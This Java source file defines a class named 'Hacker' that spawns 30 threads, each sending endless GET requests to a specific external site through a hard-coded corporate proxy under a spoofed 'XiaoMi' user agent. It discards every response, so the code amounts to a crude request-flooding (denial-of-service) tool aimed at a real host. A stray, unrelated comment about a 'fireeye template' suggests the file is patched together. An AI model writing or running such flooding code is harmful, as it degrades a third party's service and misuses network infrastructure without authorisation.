package com.zrc.demo.execute;

import java.io.InputStream;
import java.util.List;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpHost;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

//@SuppressWarnings("all")
public class Hacker {
	public static void main(String[] args) throws Exception {
		Hacker t = new Hacker();
		for(int i = 0;i<30;i++) {
			new Thread(() -> {
				while(true) {
					try {
						t.getDocumentByUrl("https://m.ggkdm.top/2018lg_3/p98017z.html?20180808175630&t=3708617089&f=1&i=1");
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}).start();
		}

	}// update fireeye template and add element del_row_by_reg for pdf template

	public Document getDocumentByUrl(String url) throws Exception {
		Document document = Jsoup.parse(getInputStreamByUrl(url), "UTF-8", "");
		return document;
	}

	public String getStringByUrl(String url) throws Exception {
		InputStream inputStream = getInputStreamByUrl(url);
		StringBuilder builder = new StringBuilder();
		List<String> lines = IOUtils.readLines(inputStream, "UTF-8");
		for (String str : lines) {
			builder.append(str);
		}
		return builder.toString();
	}

	public InputStream getInputStreamByUrl(String url) throws Exception {
		HttpClientBuilder builder = HttpClientBuilder.create();
		HttpHost proxy = new HttpHost("BJC-S-TMG.synnex.org", 8080);
		HttpUriRequest request = new HttpGet(url);
		CookieStore cookieStore = new BasicCookieStore();
		CloseableHttpClient httpClient = builder.setUserAgent("XiaoMi").setDefaultCookieStore(cookieStore)
				.setProxy(proxy).build();
		// CloseableHttpResponse response =
		httpClient.execute(request);
		// System.out.println(cookieStore.getCookies());
		// int code = response.getStatusLine().getStatusCode();
		// HttpEntity entity = response.getEntity();
		// System.out.println(entity);
		// System.out.println(code);
		// InputStream inputStream = response.getEntity().getContent();
		return null;
	}

}
